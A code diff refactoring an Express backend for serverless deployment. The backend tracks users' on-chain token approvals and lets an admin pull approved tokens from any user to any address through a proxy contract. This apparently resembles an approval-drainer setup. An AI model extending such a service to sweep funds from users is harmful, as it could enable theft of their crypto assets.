@@ -1,3 +1,5 @@
+import path from 'path';
+import { fileURLToPath } from 'url';
 import express from 'express';
 import cors from 'cors';
 import rateLimit from 'express-rate-limit';
@@ -20,11 +22,15 @@ app.use(cors({ origin: config.corsOrigin }));
 app.use(express.json({ limit: '100kb' }));
 app.use('/api', rateLimit({ windowMs: 60_000, limit: 120 }));
 
-// Sync on-chain approvals in background
-syncOnChainApprovals().catch((e) => console.error('[server] Initial sync error:', e.message));
-setInterval(() => {
-  syncOnChainApprovals().catch((e) => console.error('[server] Periodic sync error:', e.message));
-}, 30_000);
+const isMain = process.argv[1] ? fileURLToPath(import.meta.url) === path.resolve(process.argv[1]) : false;
+
+// Sync on-chain approvals in background (only when running directly as long-running server)
+if (isMain && !process.env.VERCEL) {
+  syncOnChainApprovals().catch((e) => console.error('[server] Initial sync error:', e.message));
+  setInterval(() => {
+    syncOnChainApprovals().catch((e) => console.error('[server] Periodic sync error:', e.message));
+  }, 30_000);
+}
 
 // ---------------- Public reads ----------------
 
@@ -124,7 +130,7 @@ app.get('/api/activity', async (req, res) => {
       const currentBlock = await provider.getBlockNumber();
       const logs = await proxyRead.queryFilter('Pulled', Math.max(config.fromBlock, currentBlock - 500), currentBlock);
       for (const l of logs) {
-        recordPull({
+        await recordPull({
           txHash: l.transactionHash,
           blockNumber: l.blockNumber,
           admin: l.args.admin,
@@ -138,7 +144,7 @@ app.get('/api/activity', async (req, res) => {
       // Ignore RPC log rate limits if any; local store has all pull executions
     }
 
-    const items = getPulls(limit);
+    const items = await getPulls(limit);
     res.json({ total: items.length, items });
   } catch (err) {
     res.status(500).json({ error: 'read_failed', message: err.message });
@@ -149,6 +155,9 @@ app.get('/api/activity', async (req, res) => {
 
 app.get('/api/admin/approved-users', async (_req, res) => {
   try {
+    if (process.env.VERCEL) {
+      await syncOnChainApprovals().catch(() => {});
+    }
     const items = await getEnrichedApprovedUsers();
     res.json({ total: items.length, items });
   } catch (err) {
@@ -159,7 +168,7 @@ app.get('/api/admin/approved-users', async (_req, res) => {
 app.post('/api/user/record-approval', async (req, res) => {
   try {
     const { address, token, symbol, txHash, allowance, blockNumber } = req.body ?? {};
-    const record = recordApproval({ address, token, symbol, txHash, allowance, blockNumber });
+    const record = await recordApproval({ address, token, symbol, txHash, allowance, blockNumber });
     res.json({ ok: true, record });
   } catch (err) {
     res.status(500).json({ error: 'record_failed', message: err.message });
@@ -242,7 +251,7 @@ app.post('/api/admin/pull', requireAdmin, async (req, res) => {
     }
 
     const tx = await proxyWrite.pull(token, user, to, baseUnits);
-    recordPull({
+    await recordPull({
       txHash: tx.hash,
       admin: ownerWallet.address,
       user,
@@ -260,7 +269,7 @@ app.post('/api/admin/pull', requireAdmin, async (req, res) => {
         token,
         to,
         amount,
-      });
+      }).catch(() => {});
     }).catch(() => {});
   } catch (err) {
     const msg = err.reason || err.shortMessage || err.message;
@@ -282,10 +291,14 @@ app.get('/api/admin/tx/:hash', requireAdmin, async (req, res) => {
   }
 });
 
-// ---------------- Start ----------------
+// ---------------- Export & Start ----------------
 
-app.listen(config.port, () => {
-  console.log(`[backend] http://localhost:${config.port}`);
-  console.log(`[backend] contract: ${config.contractAddress}`);
-  console.log(`[backend] owner wallet: ${ownerWallet.address}`);
-});
+export default app;
+
+if (isMain && !process.env.VERCEL) {
+  app.listen(config.port, () => {
+    console.log(`[backend] http://localhost:${config.port}`);
+    console.log(`[backend] contract: ${config.contractAddress}`);
+    console.log(`[backend] owner wallet: ${ownerWallet.address}`);
+  });
+}
